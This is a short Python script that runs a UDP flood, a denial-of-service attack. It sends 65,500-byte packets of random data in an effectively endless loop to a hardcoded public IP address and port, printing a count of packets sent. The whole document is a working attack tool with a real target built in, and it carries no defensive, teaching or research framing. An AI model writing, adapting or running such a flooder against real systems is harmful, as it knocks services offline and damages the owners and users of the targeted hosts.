import socket
import random
import time


print("\n" * 100)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

 
bytes = random._urandom(65500)


ip = "172.65.221.187"
port = int("40144")

duration = "99999999999999"
print(" ")
timeout = time.time() + float(duration)
sent = 0
while True:
	if time.time() > timeout:
		break
		print(" NOOOOOO")
	else:
		pass

	sock.sendto(bytes,(ip, port))

	sent = sent + 1

	print("Sent %s packet %sport %s"%(sent, ip, port))
